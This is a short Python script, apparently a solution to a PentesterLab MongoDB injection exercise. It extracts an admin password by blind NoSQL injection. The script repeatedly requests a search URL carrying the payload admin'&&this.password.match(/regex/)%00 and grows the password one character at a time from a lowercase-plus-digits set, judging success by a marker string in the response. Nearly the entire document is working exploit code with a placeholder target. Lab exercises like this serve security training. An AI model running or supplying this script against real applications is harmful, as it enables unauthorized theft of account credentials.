#!/usr/bin/python3

# Brute and iterate sampe/example from PTLab Mongo injection 2
# almost entirely (99.99%) from the PTLab demo/spoiler code

import urllib.request
import string

URL='BASE_URL-HERE' # CHANGE HERE

def check(payload):
        url=URL+"/?search=admin%27%26%26this.password.match(/"+payload+"/)%00"
        print("URL is "+url) # sanity check print
        resp = urllib.request.urlopen(url) # stores the response
        data = resp.read() # read the response into data
        return ">DATA<" in str(data) # Reads for the key admin in the data var CHANGE DATA HERE for field in response for success/fail


# print(check("^5.*$")) CHECK/VALIDATE for True values/PoC testing
# print(check("^a.*$")) 
# check string charset with repl
# import string
# string.ascii_lowercase
# string.digits

CHARSET=list("-"+string.ascii_lowercase+string.digits)
password=""

while True:
        for c in CHARSET: # check all characters in the set
                print("Trying: "+c+" for "+password) # status tracking print
                test = password+c # in memory tracking where we are
                if check("^"+test+".*$"): # looking at the current test
                        password+=c # if it is true, we add it to the password
                        print("char! "+password) # print the char found for password
                        break # move to next char
                elif c == CHARSET[-1]: # look for entire charset exhausted or that we have full password
                        print("[*] FOUND: "+password)
                        exit(0)
